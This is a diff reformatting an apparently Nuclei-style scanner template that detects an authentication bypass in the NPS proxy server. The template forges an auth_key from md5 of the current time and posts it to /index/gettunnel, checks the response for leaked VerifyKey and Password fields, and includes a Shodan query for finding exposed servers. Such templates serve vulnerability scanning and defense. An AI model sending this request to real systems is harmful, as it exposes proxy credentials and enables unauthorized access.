@@ -1,42 +1,44 @@
-id: nps-auth-bypass
-
-info:
-  name: NPS - Authentication Bypass
-  author: SleepingBag945
-  severity: high
-  description: |
-    This will reveal all parameters configured on the NPS, including the account username and password of the proxy.
-  reference:
-    - https://mari0er.club/post/nps.html/
-  metadata:
-    verified: true
-    shodan-query: html:"window.nps"
-  tags: nps,auth-bypass
-
 http:
-  - raw:
-      - |
-        POST /index/gettunnel HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"VerifyKey":'
+    - 'Password":'
+    - 'Id":'
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'POST /index/gettunnel HTTP/1.1
 
-        auth_key={{md5(unix_time())}}&timestamp={{unix_time()}}&offset=0&limit=10&type=socks5&client_id=&search=
+    Host: {{Hostname}}
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '"VerifyKey":'
-          - 'Password":'
-          - 'Id":'
-        condition: and
+    Content-Type: application/x-www-form-urlencoded
 
-      - type: word
-        part: header
-        words:
-          - "application/json"
 
-      - type: status
-        status:
-          - 200
+    auth_key={{md5(unix_time())}}&timestamp={{unix_time()}}&offset=0&limit=10&type=socks5&client_id=&search=
+
+    '
+id: nps-auth-bypass
+info:
+  author: SleepingBag945
+  description: 'This will reveal all parameters configured on the NPS, including the
+    account username and password of the proxy.
+
+    '
+  metadata:
+    max-request: 1
+    shodan-query: html:"window.nps"
+    verified: true
+  name: NPS - Authentication Bypass
+  reference:
+  - https://mari0er.club/post/nps.html/
+  severity: high
+  tags: nps,auth-bypass
